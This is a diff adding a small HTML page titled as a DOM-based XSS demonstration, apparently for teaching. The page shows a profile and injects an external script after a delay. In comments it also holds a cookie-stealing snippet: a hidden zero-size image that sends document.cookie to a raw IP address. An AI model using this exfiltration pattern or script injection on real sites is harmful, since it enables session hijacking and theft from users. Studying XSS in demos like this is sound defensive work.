@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <title>xssDom型</title>
+    <style>
+      #picture {
+          width: 8rem;
+          height: 8rem;
+      }
+    </style>
+    
+</head>
+<body>
+
+<div id="name">张三</div>
+<div id="age">28</div>   
+<img id="picture" src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1520930605289&di=04f8835509d8c3c3fac4db7636247431&imgtype=0&src=http%3A%2F%2Fpic.58pic.com%2F58pic%2F13%2F14%2F16%2F37J58PICWTD_1024.jpg" />
+<script>
+setTimeout(() => {
+    var xssScript = document.createElement('script');
+    xssScript.type= 'text/javascript'; 
+    xssScript.src = "http://static.360buyimg.com/nsng/common/fridge/js/jdsmart-fridge-sdk.min.js"
+    document.body.appendChild(xssScript);
+}, 3000);
+//document.getElementById("picture").src = 'https://static.zhihu.com/heifetz/vendor.7541f6184287b6f0d196.js'
+
+// var hakerImg = document.createElement('img');
+// hakerImg.width = 0;
+// hakerImg.height = 0;
+// hakerImg.src =
+// 'http://110.114.119.120:5000/?hacker='+encodeURIComponent(document.cookie);
+</script>
+</body>
+</html>
